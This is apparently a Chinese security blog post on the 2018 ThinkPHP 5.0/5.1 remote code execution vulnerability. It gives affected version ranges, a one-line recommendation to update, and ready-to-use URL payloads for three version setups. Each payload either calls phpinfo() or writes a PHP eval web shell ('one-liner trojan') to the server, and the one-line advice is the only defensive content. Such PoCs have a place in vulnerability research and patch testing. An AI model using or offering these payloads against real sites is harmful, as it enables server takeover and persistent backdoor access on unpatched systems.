---
title: "Thinkphp5.x远程代码执行"
date: 2018-12-09T20:02:07+08:00
lastmod: 2018-12-091T20:02:07+08:00
draft: false
tags: ['thinkphp','rce','php']
categories: ['Vulnerability']
comment: true
---

12月9日thinkphp官方发布安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括`5.0`和`5.1`版本，推荐尽快更新到最新版本。

<!--more-->

# 影响范围

5.x < 5.1.31

5.x < 5.0.23
# PoC
## win+thinkphp5.1.24

执行phpinfo()，**要求php版本>=7.0**



```php
/index.php/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```


![](https://y4er.com/img/uploads/20190509169823.jpg)



写shell

```html
/index.php/?s=index/\think\template\driver\file/write&cacheFile=y4er.php&content=<?php @eval($_POST[x]);?>
```


http://127.0.0.1/public/y4er.php   x



## debian+thinkphp5.1.30

执行phpinfo()，**要求php版本>=7.0**
```php
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```


![](https://image.3001.net/images/20181213/1544649324_5c117a6c9b89f.png)



写一句话木马



```html
/index.php/?s=index/\think\template\driver\file/write&cacheFile=y4er.php&content=<?php @eval($_POST[x]);?>
```

## win+thinkphp5.0.16

执行phpinfo()，**要求php版本>=7.0**



```php
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```


![](https://image.3001.net/images/20181213/1544649374_5c117a9ea54f4.png)



写一句话木马

```html
/index.php/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=y4er.php&vars[1][]=<?php @eval($_POST[x]);?>
```
